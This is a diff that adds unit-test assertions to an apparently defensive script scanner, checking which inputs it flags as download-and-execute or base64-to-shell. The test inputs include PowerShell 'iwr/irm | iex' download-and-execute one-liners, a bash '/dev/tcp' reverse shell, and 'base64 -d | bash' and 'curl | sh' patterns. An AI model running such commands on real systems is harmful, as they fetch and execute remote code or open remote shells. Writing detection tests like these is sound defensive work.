@@ -132,6 +132,23 @@ int main() {
                      "Start-Process msiexec.exe -ArgumentList $a -Wait\n", "script").flagged);
         assert(Has(Scan("iwr http://x/a.ps1 -UseBasicParsing | iex", "script"), "download-and-execute"));
         assert(!Scan("bash -i >& /dev/tcp/host/22", "html").flagged);
+        std::string spread = "iex $x\n" + std::string(3000, ' ') + "$wc.DownloadString($u)\npowershell";
+        assert(!Scan(spread, "script").flagged);
+        assert(Has(Scan("powershell\n$c=$wc.DownloadString($u); iex $c", "script"), "download-and-execute"));
+        std::string deny = "{\"invoke-webrequest\":!1,irm:!1,iwr:!1,\"invoke-expression\":!1,iex:!1} powershell";
+        assert(!Scan(deny, "script").flagged);
+        std::string aliases = "gwmi h history icm iex ihy ii ipal ipcsv ipmo ipsn irm ise iwmi iwr kill lp ls powershell";
+        assert(!Scan(aliases, "script").flagged);
+        assert(Has(Scan("powershell irm https://x/a.ps1 | iex", "script"), "download-and-execute"));
+        assert(Has(Scan("powershell iwr 'http://x/a' -useb | iex", "script"), "download-and-execute"));
+        assert(Has(Scan("powershell IEX (iwr $u)", "script"), "download-and-execute"));
+        std::string alias = "alias list: gwmi h iex ihy ii " + std::string(3000, 'x') + " powershell DownloadFile";
+        assert(!Scan(alias, "script").flagged);
+        std::string pipes = "function she(t){} var a=t|sh_x; base64 -d > /tmp/f\n";
+        assert(!Scan(pipes, "script").flagged);
+        assert(!Scan("echo x | base64 -d > f\n" + std::string(500, '#') + "\ncurl u | sh\n", "script").flagged);
+        assert(Has(Scan("echo $P | base64 -d | bash\n", "script"), "base64 and pipes it to a shell"));
+        assert(Has(Scan("eval \"$(echo $P | base64 -d)\"\n", "script"), "base64 and pipes it to a shell"));
     }
     {
         std::string big(9 * 1024 * 1024, 'a');
